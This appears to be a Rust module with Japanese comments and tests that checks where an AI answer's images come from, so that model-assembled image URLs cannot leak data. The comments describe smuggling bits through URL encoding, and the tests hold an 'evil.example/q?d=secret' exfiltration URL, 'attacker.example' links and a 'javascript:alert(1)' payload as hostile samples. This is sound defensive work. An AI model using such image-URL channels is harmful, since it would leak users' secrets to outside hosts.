//! 回答の画像の出所判定（サーバ側・#1044）。`web/src/lib/answer-images.ts`（#1005・PIT-77）と同じ規則。
//!
//! 回答に描く画像は、**その回答で取得した Web ページの本文に、画像として字句どおり現れた URL** だけ。
//! 出所に数えるのは web_fetch の封筒（`<web_page>`〜最初の `</web_page>`）の内側と、Web の引用の抜粋だけ。
//! ツール結果全般を数えると、モデルが自分で書いた文字列（検索語の反復・シェルの出力など）を経由して、
//! 組み立てた URL を出所に紛れ込ませられる。
//!
//! フロントの判定は「読み込むか・リンクにするか」の見た目を決めるだけで、**取得するかはここが決める**
//! （画像プロキシは出所に無い URL を取りに行かない）。両者が食い違っても、フロントが読もうとして
//! ここが断る（リンクに落ちる）か、フロントがリンクにする（読まない）かで、どちらも読まない側に倒れる。

use std::collections::HashMap;

use url::Url;

use crate::model::{ContentBlock, StreamEventKind};

/// ページの本文を返すツール（封筒の内側がページ由来）。語彙は codegen の単一定義から引く。
const WEB_PAGE_TOOL: &str = agent_core::ToolName::WebFetch.as_str();
/// web_fetch の封筒（正本は agent-core）。ページ由来の本文の `<web_page` / `</web_page` は
/// サーバが実体参照に潰すので、**最初の**閉じタグが本物。
use agent_core::tools::web_fetch::{PAGE_CLOSE, PAGE_OPEN};

/// 画像の代替テキスト・`<img` の属性・URL の長さの上限（フロントの正規表現と同じ。敵対的な本文で
/// 二次時間にならないよう、各部分を有界にする）。
const MAX_ALT: usize = 300;
const MAX_IMG_ATTRS: usize = 500;
const MAX_URL: usize = 2048;

/// 出典の画像。比較用の正規化した URL → **出典に書かれていた** URL（取得するのはこちら）。
///
/// 取得に回答側の字句を使うと、`a` と `%61` の書き分けや 16 進の大小で任意のビットを載せられる。
pub type ImageSources = HashMap<String, String>;

/// 比較用に URL を正規化する。http(s) 以外・資格情報付きは None。
///
/// 断片を落とし、区切りの意味を持たない文字のパーセントエンコードを戻し、残りの 16 進を大文字に揃える
/// （react-markdown と WHATWG URL のエンコードの差を吸収する・フロントと同じ）。
#[must_use]
pub fn canonical_image_url(raw: &str) -> Option<String> {
    let mut u = Url::parse(raw.trim()).ok()?;
    if !matches!(u.scheme(), "http" | "https") {
        return None;
    }
    if !u.username().is_empty() || u.password().is_some() {
        return None;
    }
    u.set_fragment(None);
    Some(normalize_percent(u.as_str()))
}

fn normalize_percent(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' && i + 2 < b.len() {
            if let (Some(h), Some(l)) = (hex(b[i + 1]), hex(b[i + 2])) {
                let c = (h << 4 | l) as char;
                if c.is_ascii_alphanumeric() || "-._~|{}^`".contains(c) {
                    out.push(c);
                } else {
                    out.push('%');
                    out.push(b[i + 1].to_ascii_uppercase() as char);
                    out.push(b[i + 2].to_ascii_uppercase() as char);
                }
                i += 3;
                continue;
            }
        }
        // `s` は Url::as_str() の出力で ASCII のみ（非 ASCII はエンコード済み）。
        out.push(b[i] as char);
        i += 1;
    }
    out
}

fn hex(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}

/// 出典の URL を取得に使う形（URL の href・断片なし）にする。
fn fetchable_url(raw: &str) -> Option<String> {
    let mut u = Url::parse(raw.trim()).ok()?;
    u.set_fragment(None);
    Some(u.into())
}

/// ツール結果の本文のうち、ページ由来の部分（web_fetch の封筒の内側）。
fn web_page_body(result: &str) -> Option<&str> {
    let start = result.find(PAGE_OPEN)? + PAGE_OPEN.len();
    let end = result[start..].find(PAGE_CLOSE)? + start;
    Some(&result[start..end])
}

/// 本文から `![alt](url)` の URL を拾う（htmd は URL の括弧を `\(` とエスケープする）。
fn markdown_image_urls(text: &str, out: &mut Vec<String>) {
    let b = text.as_bytes();
    let mut from = 0;
    while let Some(pos) = text[from..].find("![") {
        let mut i = from + pos + 2;
        from = i;
        // 代替テキスト: `]` `\` 改行以外、または `\` で始まる 2 文字。MAX_ALT 文字まで。
        let mut n = 0;
        let mut closed = false;
        while i < b.len() && n <= MAX_ALT {
            match b[i] {
                b']' => {
                    closed = true;
                    break;
                }
                b'\n' => break,
                b'\\' => {
                    i += 1;
                    if i < b.len() {
                        i += utf8_len(b[i]);
                    }
                }
                _ => i += utf8_len(b[i]),
            }
            n += 1;
        }
        if !closed || n > MAX_ALT || i >= b.len() || !text[i..].starts_with("](") {
            continue;
        }
        i += 2;
        while i < b.len() && (b[i] == b' ' || b[i] == b'\t') {
            i += 1;
        }
        if i < b.len() && b[i] == b'<' {
            i += 1;
        }
        // URL: 空白・`<` `>` `(` `)` `\` 以外の文字、または `\` で始まる 2 文字（フロントの正規表現と同じ）。
        // 非 ASCII（`グラフ.png` のような URL）もそのまま拾う。MAX_URL 文字を超えたものは捨てる。
        let mut url = String::new();
        let mut count = 0usize;
        let mut chars = text[i..].chars();
        while let Some(c) = chars.next() {
            if count > MAX_URL {
                break;
            }
            if c == '\\' {
                match chars.next() {
                    Some(next) => url.push(next),
                    None => break,
                }
            } else if c.is_whitespace() || matches!(c, '<' | '>' | '(' | ')') {
                break;
            } else {
                url.push(c);
            }
            count += 1;
        }
        if !url.is_empty() && count <= MAX_URL {
            out.push(url);
        }
    }
}

/// 生 HTML が残った場合に備え `<img ... src="url">` も拾う。
fn html_image_urls(text: &str, out: &mut Vec<String>) {
    let lower = text.to_ascii_lowercase();
    let mut from = 0;
    while let Some(pos) = lower[from..].find("<img") {
        let tag_start = from + pos + 4;
        from = tag_start;
        if lower[tag_start..]
            .chars()
            .next()
            .is_some_and(char::is_alphanumeric)
        {
            continue; // `<imgx` は img タグではない
        }
        // 閉じ `>` を有界の窓の中だけで探す（無い `<img` の連打で末尾まで走査し直さない）。
        let limit = (tag_start + MAX_IMG_ATTRS + MAX_URL + 16).min(lower.len());
        let Some(end) = lower.as_bytes()[tag_start..limit]
            .iter()
            .position(|&c| c == b'>')
            .map(|e| e + tag_start)
        else {
            continue;
        };
        let attrs = &lower[tag_start..end];
        let mut search = 0;
        while let Some(p) = attrs[search..].find("src") {
            let at = search + p;
            search = at + 3;
            if at > MAX_IMG_ATTRS {
                break;
            }
            let before_ok = at == 0 || !attrs.as_bytes()[at - 1].is_ascii_alphanumeric();
            let rest = attrs[at + 3..].trim_start();
            if !before_ok || !rest.starts_with('=') {
                continue;
            }
            let rest = rest[1..].trim_start();
            let Some(q) = rest.chars().next().filter(|c| *c == '"' || *c == '\'') else {
                continue;
            };
            let value_lower = &rest[1..];
            let Some(close) = value_lower.find(q) else {
                continue;
            };
            let offset = tag_start + (attrs.len() - rest.len()) + 1;
            let raw = &text[offset..offset + close];
            if !raw.is_empty() && raw.len() <= MAX_URL && !raw.contains(['<', '>']) {
                out.push(raw.replace("&amp;", "&"));
            }
            break;
        }
    }
}

fn utf8_len(first: u8) -> usize {
    match first {
        0xF0..=0xFF => 4,
        0xE0..=0xEF => 3,
        0xC0..=0xDF => 2,
        _ => 1,
    }
}

/// ページ由来の本文の並びから、画像として現れた URL を集める。
#[must_use]
pub fn collect_image_sources<'a>(texts: impl IntoIterator<Item = &'a str>) -> ImageSources {
    let mut out = ImageSources::new();
    for text in texts {
        let mut urls = Vec::new();
        markdown_image_urls(text, &mut urls);
        html_image_urls(text, &mut urls);
        for raw in urls {
            // 同じ画像が複数の書き方で現れたら、最初のものを使う（どれも第三者が書いた字句）。
            if let (Some(key), Some(fetch)) = (canonical_image_url(&raw), fetchable_url(&raw)) {
                out.entry(key).or_insert(fetch);
            }
        }
    }
    out
}

/// 出所になる本文を、保存済みメッセージの内容から取り出す。
///
/// `tool_results_visible` が偽（閲覧者が run の実行者でない）なら、ツール結果は数えず引用の抜粋だけ。
#[must_use]
pub fn page_texts_from_blocks(blocks: &[ContentBlock], tool_results_visible: bool) -> Vec<String> {
    let mut names: HashMap<&str, &str> = HashMap::new();
    let mut out = Vec::new();
    for b in blocks {
        match b {
            ContentBlock::ToolCall { id, name, .. } => {
                names.insert(id.as_str(), name.as_str());
            }
            ContentBlock::ToolResult {
                tool_call_id,
                content,
                ..
            } if tool_results_visible => {
                if names.get(tool_call_id.as_str()) == Some(&WEB_PAGE_TOOL) {
                    if let Some(body) = web_page_body(content) {
                        out.push(body.to_owned());
                    }
                }
            }
            ContentBlock::Citation(c) if c.web.is_some() => out.push(c.snippet.clone()),
            _ => {}
        }
    }
    out
}

/// 出所になる本文を、生成中の run のイベントから取り出す（規則は [`page_texts_from_blocks`] と同じ）。
#[must_use]
pub fn page_texts_from_events(
    events: &[StreamEventKind],
    tool_results_visible: bool,
) -> Vec<String> {
    let mut names: HashMap<&str, &str> = HashMap::new();
    let mut out = Vec::new();
    for e in events {
        match e {
            StreamEventKind::ToolCall { id, name, .. } => {
                names.insert(id.as_str(), name.as_str());
            }
            StreamEventKind::ToolResult {
                tool_call_id,
                content,
                ..
            } if tool_results_visible => {
                if names.get(tool_call_id.as_str()) == Some(&WEB_PAGE_TOOL) {
                    if let Some(body) = web_page_body(content) {
                        out.push(body.to_owned());
                    }
                }
            }
            StreamEventKind::Citation(c) if c.web.is_some() => out.push(c.snippet.clone()),
            _ => {}
        }
    }
    out
}

/// 要求された画像 URL が出所にあれば、取得に使う（出典に書かれていた）URL を返す。
#[must_use]
pub fn resolve_source(sources: &ImageSources, requested: &str) -> Option<String> {
    sources.get(&canonical_image_url(requested)?).cloned()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn envelope(body: &str) -> String {
        format!("HTTP 200 | https://news.example.com/a\n<web_page>\n{body}\n</web_page>\n（query の案内）")
    }

    fn call(id: &str, name: &str) -> ContentBlock {
        ContentBlock::ToolCall {
            id: id.into(),
            name: name.into(),
            input: serde_json::json!({}),
            step: None,
        }
    }

    fn result(id: &str, content: &str) -> ContentBlock {
        ContentBlock::ToolResult {
            tool_call_id: id.into(),
            content: content.into(),
            ok: true,
        }
    }

    #[test]
    fn collects_markdown_images_inside_the_envelope_only() {
        let page = envelope("本文 ![図1](https://img.example.com/a.png) と ![b](<https://img.example.com/b\\(1\\).jpg>)");
        let blocks = vec![
            call("1", "web_fetch"),
            result(
                "1",
                &format!("{page}\n![外](https://attacker.example/x.png)"),
            ),
        ];
        let s = collect_image_sources(
            page_texts_from_blocks(&blocks, true)
                .iter()
                .map(String::as_str),
        );
        assert!(resolve_source(&s, "https://img.example.com/a.png").is_some());
        assert_eq!(
            resolve_source(&s, "https://img.example.com/b(1).jpg").as_deref(),
            Some("https://img.example.com/b(1).jpg")
        );
        // 封筒の後ろ（モデル入力が混ざる案内）は出所にしない。
        assert!(resolve_source(&s, "https://attacker.example/x.png").is_none());
    }

    #[test]
    fn ignores_non_page_tools_and_hidden_results() {
        let page = envelope("![a](https://img.example.com/a.png)");
        let blocks = vec![call("1", "shell"), result("1", &page)];
        let s = collect_image_sources(
            page_texts_from_blocks(&blocks, true)
                .iter()
                .map(String::as_str),
        );
        assert!(s.is_empty(), "web_fetch 以外の結果は出所にしない");

        let blocks = vec![call("1", "web_fetch"), result("1", &page)];
        let s = collect_image_sources(
            page_texts_from_blocks(&blocks, false)
                .iter()
                .map(String::as_str),
        );
        assert!(s.is_empty(), "実行者でない閲覧者にはツール結果を数えない");
    }

    #[test]
    fn first_close_tag_ends_the_envelope() {
        // ページ由来の閉じタグはサーバが潰すので、残る最初の閉じタグが本物。後ろはモデル入力の案内。
        let r = "<web_page>![a](https://img.example.com/a.png)</web_page>\nquery: ![x](https://evil.example/q?d=secret)</web_page>";
        let blocks = vec![call("1", "web_fetch"), result("1", r)];
        let s = collect_image_sources(
            page_texts_from_blocks(&blocks, true)
                .iter()
                .map(String::as_str),
        );
        assert_eq!(s.len(), 1);
        assert!(resolve_source(&s, "https://evil.example/q?d=secret").is_none());
    }

    #[test]
    fn html_img_src_is_collected() {
        let page = envelope(
            r#"<p><img alt="x" class="hero" src="https://img.example.com/h.webp?w=1&amp;h=2"></p>"#,
        );
        let blocks = vec![call("1", "web_fetch"), result("1", &page)];
        let s = collect_image_sources(
            page_texts_from_blocks(&blocks, true)
                .iter()
                .map(String::as_str),
        );
        assert_eq!(
            resolve_source(&s, "https://img.example.com/h.webp?w=1&h=2").as_deref(),
            Some("https://img.example.com/h.webp?w=1&h=2")
        );
    }

    #[test]
    fn fetches_the_source_spelling_not_the_requested_one() {
        let s = collect_image_sources(["![a](https://img.example.com/abc.png)"]);
        // 回答側が %61 と書き分けても、取得するのは出典の字句。
        assert_eq!(
            resolve_source(&s, "https://img.example.com/%61bc.png").as_deref(),
            Some("https://img.example.com/abc.png")
        );
        assert_eq!(
            resolve_source(&s, "https://img.example.com/abc.png#frag").as_deref(),
            Some("https://img.example.com/abc.png")
        );
    }

    #[test]
    fn non_ascii_urls_are_collected_whole() {
        let s = collect_image_sources(["![図](https://img.example.com/グラフ.png) の説明"]);
        // フロントは react-markdown がパーセントエンコードした src で問い合わせる。
        assert_eq!(
            resolve_source(
                &s,
                "https://img.example.com/%E3%82%B0%E3%83%A9%E3%83%95.png"
            )
            .as_deref(),
            Some("https://img.example.com/%E3%82%B0%E3%83%A9%E3%83%95.png")
        );
        // 途中で切った URL（ホストだけ）を出所にしない。
        assert!(resolve_source(&s, "https://img.example.com/").is_none());
    }

    #[test]
    fn rejects_credentials_and_non_http() {
        let s = collect_image_sources([
            "![a](https://u:p@img.example.com/a.png) ![b](javascript:alert(1)) ![c](data:image/png;base64,AAAA)",
        ]);
        assert!(s.is_empty());
        assert!(canonical_image_url("ftp://x.example/a.png").is_none());
    }

    #[test]
    fn web_citation_snippets_count_but_document_citations_do_not() {
        let web = agent_core::Citation::web(
            "https://news.example.com/a",
            "t",
            "![a](https://img.example.com/a.png)",
        )
        .unwrap();
        let blocks = vec![ContentBlock::Citation((&web).into())];
        let s = collect_image_sources(
            page_texts_from_blocks(&blocks, false)
                .iter()
                .map(String::as_str),
        );
        assert!(resolve_source(&s, "https://img.example.com/a.png").is_some());
    }

    #[test]
    fn adversarial_input_stays_linear() {
        let body = "![".repeat(50_000) + "<img ".repeat(50_000).as_str();
        let start = std::time::Instant::now();
        let _ = collect_image_sources([body.as_str()]);
        assert!(start.elapsed() < std::time::Duration::from_secs(2));
    }
}
